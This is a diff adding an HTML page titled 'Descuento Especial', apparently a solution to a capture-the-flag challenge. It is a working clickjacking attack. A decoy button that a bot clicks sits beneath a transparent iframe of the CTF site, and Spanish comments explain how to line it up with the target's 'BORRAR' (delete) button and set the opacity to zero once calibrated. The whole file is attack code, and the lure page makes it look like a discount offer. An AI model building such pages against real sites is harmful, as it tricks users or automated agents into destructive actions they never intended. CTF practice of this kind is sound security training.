@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Descuento Especial</title>
+    <style>
+        body { margin: 0; padding: 0; }
+        
+        /* Contenedor relativo para posicionar todo */
+        .container { position: relative; width: 100%; height: 100vh; }
+
+        /* El botón invisible que el bot buscará por ID */
+        #objetivo {
+            position: absolute;
+            z-index: 1; /* Estará "debajo" visualmente */
+            /* AJUSTA ESTOS VALORES SEGÚN DONDE ESTÉ EL BOTÓN 'BORRAR' */
+            top: 250px; 
+            left: 150px; 
+            width: 120px;
+            height: 40px;
+            cursor: pointer;
+        }
+
+        /* La web del CTF (Iframe) */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 2; /* El iframe está "encima" para recibir el clic */
+            /* Ponlo en 0.5 para calibrar, luego a 0 para el bot */
+            opacity: 0.5; 
+            pointer-events: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button id="objetivo">Haz clic aquí</button>
+        
+        <iframe src="https://ctf.fap.hispasec.com:8018/"></iframe>
+    </div>
+</body>
+</html>
